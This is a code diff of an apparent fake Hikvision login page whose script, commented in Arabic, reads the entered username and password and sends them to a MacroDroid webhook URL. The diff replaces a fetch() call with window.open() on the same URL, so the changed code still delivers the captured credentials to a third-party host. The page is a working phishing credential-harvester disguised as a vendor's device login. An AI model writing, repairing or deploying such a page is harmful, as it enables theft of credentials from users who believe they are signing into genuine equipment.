@@ -45,7 +45,7 @@
  <div class=footer id=footer bis_skin_checked=1>©2019 Hikvision Digital Technology Co., Ltd. All Rights Reserved.</div>
 
 <script>
-// وظيفة لإرسال البيانات إلى رابط الـ webhook
+// وظيفة لفتح الرابط في نافذة جديدة مع المتغيرات
 function sendData() {
     // جلب اسم المستخدم وكلمة المرور من الحقول
     const username = document.getElementById('username').value;
@@ -54,20 +54,7 @@ function sendData() {
     // إعداد رابط الـ webhook مع المتغيرات
     const webhook_url = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
-    // إرسال البيانات عبر fetch
-    fetch(webhook_url, {
-        method: 'GET'  // يمكن تغييره إلى POST حسب المتطلبات
-    })
-    .then(response => {
-        if (response.ok) {
-            alert('تم إرسال البيانات بنجاح');
-        } else {
-            alert('حدث خطأ أثناء إرسال البيانات');
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('فشل إرسال البيانات');
-    });
+    // فتح الرابط في نافذة جديدة
+    window.open(webhook_url, '_blank');
 }
 </script>
